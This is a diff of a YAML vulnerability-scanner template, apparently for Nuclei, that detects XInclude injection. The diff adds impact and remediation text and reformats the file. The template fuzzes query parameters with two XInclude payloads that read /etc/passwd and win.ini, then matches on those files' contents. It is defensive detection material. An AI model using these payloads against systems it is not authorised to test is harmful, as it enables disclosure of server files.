@@ -1,46 +1,85 @@
 id: xinclude-injection
-
 info:
   name: XInclude Injection - Detection
   author: DhiyaneshDK,ritikchaddha
   severity: high
-  description: |
-    XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.
+  description: 'XInclude is a part of the XML specification that allows an XML document
+    to be built from sub-documents. You can place an XInclude attack within any data
+    value in an XML document, so the attack can be performed in situations where you
+    only control a single item of data that is placed into a server-side XML document.
+
+    '
   reference:
-    - https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks
+  - https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks
   tags: dast,xxe,xinclude
+  impact: '- An attacker could gain access to sensitive files and directories on the
+    server by injecting malicious XInclude tags and successfully resolving them.
 
+    - The attacker could leverage XInclude injection to execute arbitrary code on
+    the server and potentially escalate privileges.
+
+    - By inserting malicious XInclude tags, the attacker could disclose the server''s
+    configuration and system details, which could be used for further attacks.
+
+    - The attacker could perform denial-of-service (DoS) attacks by injecting large
+    or recursive XInclude payloads, leading to excessive resource consumption on the
+    server.
+
+    - An attacker could potentially bypass security mechanisms and access restricted
+    areas of the application by exploiting the trust placed in the XML parsing process.'
+  remediation: 'To address the XInclude Injection - Detection vulnerability, the following
+    remediation steps should be taken:
+
+
+    Developers should implement robust input validation and sanitization mechanisms
+    to prevent the injection of malicious XInclude tags into any user-supplied data
+    that is subsequently processed by the XML parser. This includes, but is not limited
+    to, validating and sanitizing all user input, including query parameters, form
+    fields, and API request payloads, before incorporating them into the XML document.
+
+
+    - Ensure that all user-supplied data is properly validated and sanitized before
+    being used in the XML document.
+
+    - Implement a whitelist-based approach to input validation, where only known-safe
+    characters and values are allowed, rather than attempting to remove known malicious
+    ones.
+
+    - Consider disabling the XInclude feature in the XML parser unless it is absolutely
+    necessary for the application''s functionality.
+
+    - Implement strict error handling and logging mechanisms to detect and respond
+    to any attempts of XInclude injection, and ensure that these events are properly
+    reported and investigated.
+
+    - Regularly review and update the application''s XML parsing libraries and dependencies
+    to ensure they are up-to-date and not vulnerable to known XInclude Injection vulnerabilities.'
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-          - 'method == "POST"'
-
-    payloads:
-      xinc_fuzz:
-        - '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></asd>'
-        - '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></asd>'
-
-    fuzzing:
-      - part: query
-        type: replace # replaces existing parameter value with fuzz payload
-        mode: multiple # replaces all parameters value with fuzz payload
-        fuzz:
-          - '{{xinc_fuzz}}'
-
-    stop-at-first-match: true
-    matchers-condition: or
-    matchers:
-      - type: regex
-        name: linux
-        part: body
-        regex:
-          - 'root:.*?:[0-9]*:[0-9]*:'
-
-      - type: word
-        name: windows
-        part: body
-        words:
-          - 'for 16-bit app support'
-# digest: 490a0046304402207a9b4788db70b76e3e302ea9bcb1db6b7f7e9b54227688c7d8a1ed57482ceb7b0220351c08f3f79d82384fc13d8d8136691ac121a975411566bff706da9302acf29d:922c64590222798bb761d5b6d8e72950
+- pre-condition:
+  - type: dsl
+    dsl:
+    - method == "GET"
+    - method == "POST"
+  payloads:
+    xinc_fuzz:
+    - <asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></asd>
+    - <asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></asd>
+  fuzzing:
+  - part: query
+    type: replace
+    mode: multiple
+    fuzz:
+    - '{{xinc_fuzz}}'
+  stop-at-first-match: true
+  matchers-condition: or
+  matchers:
+  - type: regex
+    name: linux
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
+  - type: word
+    name: windows
+    part: body
+    words:
+    - for 16-bit app support
